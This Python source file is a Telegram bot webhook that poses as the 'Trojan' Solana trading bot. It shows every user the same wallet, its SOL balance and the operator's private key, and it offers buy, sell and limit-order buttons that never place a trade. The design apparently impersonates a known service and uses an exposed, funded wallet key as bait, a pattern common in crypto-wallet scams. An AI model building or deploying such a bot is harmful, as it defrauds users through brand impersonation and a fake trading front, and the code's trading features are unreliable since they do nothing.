def handler(request):
    return "ok"

import os
import requests

BOT_TOKEN = os.environ.get("BOT_TOKEN")
SOL_ADDRESS = os.environ.get("SOL_ADDRESS")
PRIVATE_KEY = os.environ.get("PRIVATE_KEY")  # ⚠ NOT RECOMMENDED

TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

# ---- In-memory state (resets on redeploy) ----
user_seen_private_key = {}
user_action = {}
limit_orders = {}

FIRST_WARNING = (
    "⚠ WARNING: DO NOT CLICK on any ADs at the top of Telegram, they are NOT from us and most likely SCAMS.\n\n"
    "Moderators, Support Staff and Admins will never Direct Message first or call you!"
)

WELCOME_INFO = (
    "Welcome to Trojan, the most used Trading Telegram bot...\n\n"
    "After you click continue, wallet details will be shown."
)

HELP_TEXT = """📌 Fees: 0.9%
🔒 Security: No login needed
📊 Trading tips: slippage & timeout"""

# ---- Telegram helpers ----
def send_message(chat_id, text, keyboard=None):
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "Markdown"
    }
    if keyboard:
        payload["reply_markup"] = keyboard
    requests.post(f"{TELEGRAM_API}/sendMessage", json=payload)

def main_menu():
    return {
        "inline_keyboard": [
            [
                {"text": "🟢 Buy", "callback_data": "buy"},
                {"text": "🔴 Sell", "callback_data": "sell"}
            ],
            [
                {"text": "📈 Limit Buy", "callback_data": "limit_buy"},
                {"text": "📉 Limit Sell", "callback_data": "limit_sell"}
            ],
            [
                {"text": "🔄 Refresh", "callback_data": "refresh"},
                {"text": "❓ Help", "callback_data": "help"}
            ]
        ]
    }

def get_solana_balance(address):
    try:
        payload = {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "getBalance",
            "params": [address]
        }
        r = requests.post("https://api.mainnet-beta.solana.com", json=payload, timeout=8)
        return r.json()["result"]["value"] / 1_000_000_000
    except:
        return 0.0

def fetch_token_info(contract):
    try:
        r = requests.get(f"https://api.dexscreener.com/latest/dex/tokens/{contract}", timeout=8)
        pairs = r.json().get("pairs", [])
        if not pairs:
            return None
        p = max(pairs, key=lambda x: x.get("volume", {}).get("h24", 0))
        return {
            "name": p["baseToken"]["name"],
            "symbol": p["baseToken"]["symbol"],
            "price": p["priceUsd"]
        }
    except:
        return None

# ---- Webhook Entry ----
def handler(request):
    data = request.get_json()

    # MESSAGE
    if "message" in data:
        msg = data["message"]
        chat_id = msg["chat"]["id"]
        text = msg.get("text", "")

        if text == "/start":
            if user_seen_private_key.get(chat_id):
                bal = get_solana_balance(SOL_ADDRESS)
                send_message(
                    chat_id,
                    f"💳 `{SOL_ADDRESS}`\n💰 {bal:.6f} SOL",
                    main_menu()
                )
            else:
                send_message(chat_id, FIRST_WARNING)
                send_message(
                    chat_id,
                    WELCOME_INFO,
                    {
                        "inline_keyboard": [
                            [{"text": "➡ Continue", "callback_data": "continue_wallet"}]
                        ]
                    }
                )
        else:
            action = user_action.get(chat_id)
            if not action:
                send_message(chat_id, "⚠ Use menu buttons first.")
                return "ok"

            info = fetch_token_info(text)
            if not info:
                send_message(chat_id, "⚠ Invalid contract.")
                return "ok"

            user_action[chat_id] = {"stage": "amount", "type": action, "contract": text}
            send_message(
                chat_id,
                f"✅ {info['name']} ({info['symbol']})\n💲 {info['price']}\nSend amount."
            )

    # CALLBACK
    if "callback_query" in data:
        q = data["callback_query"]
        chat_id = q["message"]["chat"]["id"]
        d = q["data"]

        if d == "continue_wallet":
            user_seen_private_key[chat_id] = True
            bal = get_solana_balance(SOL_ADDRESS)
            send_message(
                chat_id,
                f"🟣 Wallet\n`{SOL_ADDRESS}`\n💰 {bal:.6f} SOL\n\n🔒 `{PRIVATE_KEY}`",
                main_menu()
            )

        elif d in ["buy", "sell", "limit_buy", "limit_sell"]:
            user_action[chat_id] = d
            send_message(chat_id, "Send token contract address.")

        elif d == "refresh":
            bal = get_solana_balance(SOL_ADDRESS)
            send_message(chat_id, f"💰 {bal:.6f} SOL", main_menu())

        elif d == "help":
            send_message(chat_id, HELP_TEXT, main_menu())

    return "ok"
